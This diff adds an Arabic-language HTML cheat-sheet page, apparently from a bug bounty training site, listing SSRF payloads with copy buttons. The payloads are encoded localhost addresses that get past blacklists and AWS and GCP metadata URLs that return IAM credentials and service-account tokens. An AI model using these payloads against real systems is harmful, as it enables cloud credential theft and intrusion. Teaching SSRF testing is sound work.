@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>SSRF Cloud & Bypass Decision Tree | Bug Bounty Academy</title>
+  <link rel="stylesheet" href="../assets/css/style.css?v=1.0">
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Fira+Code:wght@400;600&family=Outfit:wght@600;800&display=swap" rel="stylesheet">
+  <style>
+    :root { var(--bg-dark): #060913; --card-border: rgba(48, 63, 96, 0.4); --accent-orange: #f97316; --accent-cyan: #38bdf8; --accent-gold: #facc15; }
+    body { background: radial-gradient(circle at top center, #111827 0%, #060913 100%); color: #e2e8f0; font-family: 'Cairo', sans-serif; margin: 0; padding: 0; line-height: 1.8; min-height: 100vh; }
+    .doc-container { max-width: 1400px; margin: 0 auto; padding: 40px 25px; }
+    .doc-header { background: rgba(13, 19, 34, 0.8); border: 1px solid var(--card-border); backdrop-filter: blur(12px); border-radius: 16px; padding: 30px; margin-bottom: 35px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
+    .doc-title { font-size: 2.4rem; color: #fff; font-weight: 800; display: flex; align-items: center; gap: 15px; margin: 10px 0; }
+    .doc-title i { color: var(--accent-orange); filter: drop-shadow(0 0 10px rgba(249, 115, 22, 0.5)); }
+    .doc-subtitle { color: #94a3b8; font-size: 1.15rem; margin: 0; }
+    
+    .controls-bar { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 30px; align-items: center; justify-content: space-between; }
+    .search-box { position: relative; flex: 1; min-width: 300px; }
+    .search-box i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #64748b; font-size: 1.3rem; }
+    .search-input { width: 100%; background: #0d1322; border: 1px solid var(--card-border); padding: 12px 45px 12px 15px; border-radius: 10px; color: #fff; font-family: 'Cairo', sans-serif; font-size: 1rem; outline: none; }
+    
+    .section-card { background: rgba(13, 19, 34, 0.7); border: 1px solid var(--card-border); backdrop-filter: blur(10px); border-radius: 14px; padding: 28px; margin-bottom: 30px; }
+    .section-title { font-size: 1.5rem; color: var(--accent-cyan); border-right: 4px solid var(--accent-orange); padding-right: 15px; margin-top: 0; margin-bottom: 22px; font-weight: 800; }
+    .cs-table-wrapper { overflow-x: auto; border-radius: 10px; border: 1px solid rgba(255,255,255,0.05); }
+    .cs-table { width: 100%; border-collapse: collapse; direction: ltr; text-align: left; font-size: 0.92rem; }
+    .cs-table th { background: #161f36; color: var(--accent-gold); padding: 14px 18px; font-family: 'Outfit', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+    .cs-table td { padding: 14px 18px; border-bottom: 1px solid rgba(255,255,255,0.04); font-family: 'Fira Code', monospace; color: #38bdf8; word-break: break-all; }
+    .btn-copy { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #e2e8f0; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; font-family: 'Cairo', sans-serif; font-weight: 700; float: right; display: flex; align-items: center; gap: 5px; }
+    .btn-copy:hover { background: var(--accent-orange); color: #000; }
+    .copy-toast { position: fixed; bottom: 30px; left: 30px; background: #22c55e; color: #000; padding: 12px 24px; border-radius: 8px; font-weight: 800; display: none; z-index: 9999; }
+  </style>
+</head>
+<body>
+  <div class="doc-container">
+    <header class="doc-header">
+      <a href="cheatsheet-hub.html" style="color:var(--accent-cyan); text-decoration:none; font-weight:bold; display:inline-flex; align-items:center; gap:6px; margin-bottom:12px;"><i class="bx bx-right-arrow-alt" style="font-size:1.3rem;"></i> العودة لمركز المراجع</a>
+      <h1 class="doc-title"><i class="bx bx-globe"></i> SSRF Cloud & Bypass Decision Tree</h1>
+      <p class="doc-subtitle">مرجع ثغرات Server-Side Request Forgery وتجاوزات الـ Blacklist والوصول لسيرفرات الكلاود Metadata.</p>
+    </header>
+
+    <div class="controls-bar">
+      <div class="search-box">
+        <i class="bx bx-search"></i>
+        <input type="text" id="payload-search" class="search-input" placeholder="بحث سريع في شفرات SSRF (مثال: aws, 169.254, decimal, metadata)..." onkeyup="filterPayloads()">
+      </div>
+    </div>
+
+    <!-- 1. LOCALHOST BYPASSES -->
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>1. Localhost Blacklist Bypasses (تجاوز فلاتر الـ 127.0.0.1)</span> <i class="bx bx-shield-quarter" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:180px;">Bypass Method</th><th>Exploit Payload</th></tr></thead>
+          <tbody>
+            <tr><td>Decimal IP Encoding</td><td><code>http://2130706433/</code> <button class="btn-copy" onclick="copyCode('http://2130706433/')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr><td>Octal IP Encoding</td><td><code>http://017700000001/</code> <button class="btn-copy" onclick="copyCode('http://017700000001/')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr><td>Shortened Localhost</td><td><code>http://127.1/</code> OR <code>http://0/</code> <button class="btn-copy" onclick="copyCode('http://127.1/')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- 2. CLOUD METADATA ENDPOINTS -->
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>2. Cloud Provider Metadata Endpoints (استخراج مفاتيح الكلاود)</span> <i class="bx bx-cloud" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:180px;">Cloud Provider</th><th>Metadata Endpoint Payload</th></tr></thead>
+          <tbody>
+            <tr><td>AWS EC2 IAM Roles</td><td><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> <button class="btn-copy" onclick="copyCode('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr><td>Google Cloud (GCP)</td><td><code>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</code> <button class="btn-copy" onclick="copyCode('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <div id="toast" class="copy-toast"><i class="bx bx-check-circle"></i> تم نسخ شفرة SSRF بنجاح!</div>
+
+  <script>
+    function copyCode(text) {
+      navigator.clipboard.writeText(text);
+      const toast = document.getElementById("toast");
+      toast.style.display = "block";
+      setTimeout(() => toast.style.display = "none", 2500);
+    }
+    function filterPayloads() {
+      const query = document.getElementById("payload-search").value.toLowerCase();
+      document.querySelectorAll(".payload-card").forEach(card => {
+        card.style.display = card.innerText.toLowerCase().includes(query) ? "" : "none";
+      });
+    }
+  </script>
+</body>
+</html>
